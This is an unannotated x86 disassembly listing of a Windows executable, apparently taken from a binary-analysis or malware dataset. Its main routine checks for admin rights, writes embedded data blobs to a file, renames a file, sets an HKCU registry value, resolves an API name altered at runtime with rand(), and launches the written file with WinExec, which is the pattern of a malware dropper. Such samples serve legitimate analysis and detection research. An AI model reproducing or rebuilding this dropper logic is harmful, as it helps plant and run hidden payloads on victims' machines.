sub_401000
push ebp
mov ebp esp
push ecx
push ecx
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] 0x1
push eax
push 0xf003f
push 0x0
push rw-data
push 0x80000001
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
leave
retn
lea eax [ ebp - 0x8 ]
push 0x4
push eax
push 0x4
push 0x0
push rw-data
push [ ebp - 0x4 ]
call [ RegSetValueExA@IAT ]
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
sub_401058
push ecx
mov al [ esp + 0x3 ]
push esi
push edi
mov edi rw-data
push 0x0
mov ecx edi
mov [ rw-data ] al
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
mov esi rw-data
push esi
call strlen
pop ecx
push eax
push esi
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
pop edi
pop esi
pop ecx
retn
sub_4010b1
push ecx
mov al [ esp + 0x3 ]
push esi
push edi
mov edi rw-data
push 0x0
mov ecx edi
mov [ rw-data ] al
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
mov esi rw-data
push esi
call strlen
pop ecx
push eax
push esi
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
pop edi
pop esi
pop ecx
retn
sub_401100
mov eax sub_401642
call sub_401470
sub esp 0x2bc
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
push rw-data
call [ LoadLibraryA@IAT ]
and [ ebp - 0x17c ] 0x0
push 0x41
mov [ ebp - 0x18 ] eax
pop ecx
xor eax eax
lea edi [ ebp - 0x17b ]
and [ ebp - 0x2c8 ] al
and [ ebp - 0x4 ] eax
[ edi ]
push 0x41
lea edi [ ebp - 0x2c7 ]
pop ecx
[ edi ]
lea eax [ ebp - 0x17c ]
push 0x104
push eax
push rw-data
call [ rw-data ]
push 0x6
mov esi rw-data
pop ecx
lea edi [ ebp - 0x64 ]
[ edi ] [ esi ]
or [ ebp - 0x4 ] 0xffffffff
movsw [ edi ] [ esi ]
mov esi rw-data
push rw-data
lea eax [ ebp - 0x28 ]
push esi
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
push rw-data
lea eax [ ebp - 0x38 ]
push esi
push eax
mov [ ebp - 0x4 ] 0x2
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0x18
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x4 ] 0x3
test eax eax
jne r-xdata
lea eax [ ebp - 0x64 ]
push eax
push [ ebp - 0x18 ]
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
call [ rand@IAT ]
movsx ecx [ ebp - 0x64 ]
add eax ecx
mov ecx 0x100
cdq
idiv ecx
mov [ ebp - 0x64 ] dl
jmp r-xdata
lea ecx [ ebp - 0x17c ]
push 0x104
push ecx
push eax
call [ rw-data ]
test eax eax
je r-xdata
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Nullstr::_C::~_C@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0x1
mov [ ebp - 0x4 ] 0x2
pop esi
jmp r-xdata
call [ IsUserAnAdmin@IAT ]
mov esi [ fopen@IAT ]
mov edi rw-data
test eax eax
lea eax [ ebp - 0x17c ]
push edi
push eax
setne [ ebp - 0x11 ]
call esi
cmp [ ebp - 0x11 ] 0x0
pop ecx
pop ecx
mov ebx eax
jne r-xdata
push esi
lea ecx [ ebp - 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
or [ ebp - 0x4 ] 0xffffffff
push esi
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
mov ecx [ ebp - 0xc ]
pop edi
pop esi
xor eax eax
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x10
mov edi [ fwrite@IAT ]
push ebx
push 0x190
push 0x1
pop esi
push esi
push r--data
call edi
add esp 0x10
cmp eax 0x190
push ebx
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
call [ fclose@IAT ]
pop ecx
jmp r-xdata
push 0xb870
push esi
push r--data
call edi
add esp 0x10
cmp eax 0xb870
push ebx
je r-xdata
lea ecx [ ebp - 0x17c ]
push 0x104
push ecx
push eax
call [ rw-data ]
test eax eax
je r-xdata
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Nullstr::_C::~_C@IAT ]
mov [ ebp - 0x4 ] 0x2
call [ fclose@IAT ]
cmp [ ebp - 0x11 ] 0x0
pop ecx
jne r-xdata
lea eax [ ebp - 0x17c ]
push edi
push eax
call esi
mov ebx eax
pop ecx
test ebx ebx
pop ecx
jne r-xdata
lea eax [ ebp - 0x17c ]
push eax
lea eax [ ebp - 0x2c8 ]
push eax
call strcpy
lea eax [ ebp - 0x17c ]
push eax
call strlen
and [ ebp + eax - 0x2c9 ] 0x0
add esp 0xc
lea eax [ ebp - 0x2c8 ]
push eax
lea eax [ ebp - 0x17c ]
push eax
call [ MoveFileA@IAT ]
call sub_401000
push 0x44
xor ebx ebx
pop edi
lea eax [ ebp - 0x1c0 ]
push edi
push ebx
push eax
call memset
push 0x10
lea eax [ ebp - 0x74 ]
push ebx
push eax
mov [ ebp - 0x1c0 ] edi
call memset
add esp 0x18
lea eax [ ebp - 0x17c ]
push 0x104
push eax
push rw-data
call [ rw-data ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x17c ]
mov [ ebp - 0x4 ] 0x4
push eax
call [ rw-data ]
jmp r-xdata
lea eax [ ebp - 0x17c ]
push rw-data
push eax
call strcat
pop ecx
lea eax [ ebp - 0x17c ]
pop ecx
push ebx
push eax
call [ WinExec@IAT ]
mov [ ebp - 0x4 ] 0x3
sub_4012d8
mov esi rw-data
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
xor esi esi
lea ecx [ ebp - 0x17c ]
push ecx
call eax
push esi
push esi
push 0x1
push esi
call [ CreateEventA@IAT ]
push 0xffffffff
push eax
call [ WaitForSingleObject@IAT ]
mov eax r-xdata
retn
lea eax [ ebp - 0x48 ]
push eax
push [ ebp - 0x18 ]
call [ GetProcAddress@IAT ]
dec [ ebp - 0x48 ]
mov [ rw-data ] eax
jmp r-xdata
cmp eax esi
jne r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_401615
cmp [ rw-data ] ebx
jne r-xdata
call sub_401600
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_401612
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_401100
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_40104e
call sub_401058
jmp sub_40108d
sub_40108d
push sub_401099
call sub_401442
pop ecx
retn
sub_401099
push 0x1
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
retn
sub_4010a7
call sub_4010b1
jmp sub_4010e6
sub_4010e6
push sub_4010f2
call sub_401442
pop ecx
retn
sub_4010f2
push 0x1
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
retn
sub_4011aa
mov eax r-xdata
retn
??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
jmp [ std::operator&@IAT ]
strlen
jmp [ strlen@IAT ]
sub_401416
cmp [ rw-data ] 0xffffffff
jne r-xdata
push rw-data
push rw-data
push [ esp + 0xc ]
call __dllonexit
add esp 0xc
retn
push [ esp + 0x4 ]
call [ _onexit@IAT ]
pop ecx
retn
sub_401442
push [ esp + 0x4 ]
call sub_401416
neg eax
sbb eax eax
pop ecx
neg eax
dec eax
retn
strcat
jmp [ strcat@IAT ]
memset
jmp [ memset@IAT ]
strcpy
jmp [ strcpy@IAT ]
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
sub_401470
push 0xffffffff
push eax
mov eax [ fs : 0x0 ]
push eax
mov eax [ esp + 0xc ]
mov [ fs : 0x0 ] esp
mov [ esp + 0xc ] ebp
lea ebp [ esp + 0xc ]
push eax
retn
sub_4015e1
mov esp [ ebp - 0x18 ]
push [ ebp - 0x78 ]
call [ _exit@IAT ]
int3
__dllonexit
jmp [ __dllonexit@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_401600
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_401612
xor eax eax
retn
sub_401615
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
sub_401630
lea ecx [ ebp - 0x28 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_401639
lea ecx [ ebp - 0x38 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_401642
mov eax r--data
jmp __CxxFrameHandler
